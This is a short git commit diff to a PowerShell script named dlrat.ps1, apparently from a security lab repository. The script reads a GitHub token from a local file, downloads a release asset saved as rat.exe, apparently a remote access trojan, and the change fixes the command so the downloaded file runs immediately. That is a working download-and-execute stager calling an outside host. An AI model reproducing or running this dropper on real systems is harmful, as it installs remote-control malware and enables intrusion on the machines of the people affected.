0bd10b4af73205307bf5caccaeaa5a5b132ad7cf
maki2010 <106727666+maki2010@users.noreply.github.com>
2022-06-23 16:43:59 +0900

    Update dlrat.ps1

--- dlrat.ps1
+++ dlrat.ps1
@@ -1,3 +1,4 @@
+#TEST11 
 $tkn= Get-Content "C:\CRDemo\tkn.txt"
 $headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}
-Invoke-WebRequest "https://api.github.com/repos/maki2010/seclab/releases/assets/68732756" -Headers $headers -OutFile C:\CRDemo\rat.exe: C;\CRDemo\rat.exe
+Invoke-WebRequest "https://api.github.com/repos/maki2010/seclab/releases/assets/68732756" -Headers $headers -OutFile C:\CRDemo\rat.exe; C:\CRDemo\rat.exe
